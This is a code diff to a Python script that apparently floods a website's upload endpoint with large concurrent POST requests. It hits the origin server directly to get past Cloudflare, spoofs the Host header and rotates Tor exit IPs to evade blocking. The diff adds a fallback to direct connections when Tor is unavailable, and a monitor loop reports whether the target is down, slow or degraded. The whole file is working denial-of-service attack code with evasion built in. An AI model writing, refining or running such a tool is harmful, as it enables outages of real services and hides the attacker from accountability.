@@ -50,15 +50,26 @@ print(f"[*] File size: {len(FILE_BYTES)/1024/1024:.1f} MB")
 # Tor NEWNYM
 ctrl = None
 ctrl_lock = threading.Lock()
+USE_TOR = False
+
 if not args.no_tor:
+    import socket
     try:
-        from stem import Signal
-        from stem.control import Controller
-        ctrl = Controller.from_port(port=9051)
-        ctrl.authenticate()
-        print(f"[+] Tor control connected")
-    except Exception as e:
-        print(f"[!] Tor control failed: {e} — running without NEWNYM")
+        s = socket.create_connection(("127.0.0.1", 9050), timeout=2); s.close()
+        USE_TOR = True
+        print(f"[+] Tor SOCKS5 available on :9050")
+    except:
+        print(f"[!] Tor not running on :9050 — using direct connection")
+
+    if USE_TOR:
+        try:
+            from stem import Signal
+            from stem.control import Controller
+            ctrl = Controller.from_port(port=9051)
+            ctrl.authenticate()
+            print(f"[+] Tor control connected (NEWNYM enabled)")
+        except Exception as e:
+            print(f"[!] Tor control unavailable: {e} — no NEWNYM")
 
 def new_ip():
     if ctrl:
@@ -76,7 +87,7 @@ def monitor_loop():
         try:
             r = requests.get(f"https://{args.origin}/", timeout=12, verify=False,
                              headers={"Host": args.host, "User-Agent": "Mozilla/5.0 Chrome/124"},
-                             proxies=PROXIES if not args.no_tor else {})
+                             proxies=PROXIES if USE_TOR else {})
             ms, code = (time.time()-t0m)*1000, r.status_code
             color, tag = (R,"DOWN") if code==503 else (G,"FAST") if ms<800 else (Y,"SLOW") if ms<2000 else (R,"DEGRADED")
         except:
@@ -95,7 +106,7 @@ print(f"  Origin      : {args.origin} (CF bypassed)")
 print(f"  Host        : {args.host}")
 print(f"  File        : {args.file_mb} MB per request")
 print(f"  Concurrency : {args.concurrency}")
-print(f"  Proxy       : {'TorPool (NEWNYM/burst)' if not args.no_tor else 'None (direct)'}")
+print(f"  Proxy       : {'TorPool (NEWNYM/burst)' if USE_TOR else 'Direct (no Tor)'}")
 print(f"{B}{'='*68}{W}\n")
 print(f"  {'BURST':<6} {'TIME':<9} {'200':>4} {'500':>4} {'403':>4} {'ERR':>4} {'AVG':>7}  STATUS")
 print(f"  {'─'*66}")
@@ -105,7 +116,7 @@ def fire(_):
     try:
         files = {"file-upload": ("data.txt", io.BytesIO(FILE_BYTES), "text/plain")}
         r = requests.post(TARGET, headers=HEADERS, data=FIELDS, files=files,
-                         proxies=PROXIES if not args.no_tor else {},
+                         proxies=PROXIES if USE_TOR else {},
                          timeout=180, verify=False)
         return r.status_code, time.time() - t0
     except Exception:
